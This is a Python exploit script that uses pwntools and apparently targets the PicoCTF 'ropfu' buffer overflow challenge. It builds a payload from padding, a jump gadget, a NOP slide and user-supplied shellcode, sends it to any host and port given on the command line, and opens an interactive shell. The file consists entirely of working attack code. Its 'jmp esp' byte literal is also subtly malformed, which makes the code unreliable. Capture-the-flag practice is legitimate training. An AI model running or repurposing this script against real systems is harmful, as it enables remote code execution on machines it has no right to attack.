from argparse import ArgumentParser
from pwn import *
import time

def craftPayload(shellcode_path: str):
    fp = open(shellcode_path, "rb")
    shellcode = fp.read()
    fp.close()

    # ROP Gadgets:
    # 0x0805333b : jmp eax

    rop_chain   = struct.pack("<I", 0x0805333b)     # 0x0805333b : jmp eax
    instruction = b"\xFF\XE4"                       # jmp esp
    
    padding = b"A" * (28 - len(instruction))
    nop_slide = b"\x90" * 50

    payload = padding + instruction + rop_chain + nop_slide + shellcode

    return payload

def exploit(target: str, port: int, shellcode_path: str):
    payload = craftPayload(shellcode_path)

    p = remote(str(target), int(port))
    p.recvuntil(b"\n")
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    parser = ArgumentParser(
        prog="PicoCTF ropfu Exploit",
        description="Exploit for the PicoCTF ropfu challenge",
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="set target IP or URL address",
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        help="set target port",
    )
    parser.add_argument(
        "-s", "--shellcode",
        required=True,
        help="set shellcode file path",
    )
    
    args = parser.parse_args()

    TARGET_HOST : str       = str(args.target)
    TARGET_PORT : int       = int(args.port)
    SHELLCODE_PATH : str    = str(args.shellcode)
    exploit(TARGET_HOST, TARGET_PORT, SHELLCODE_PATH)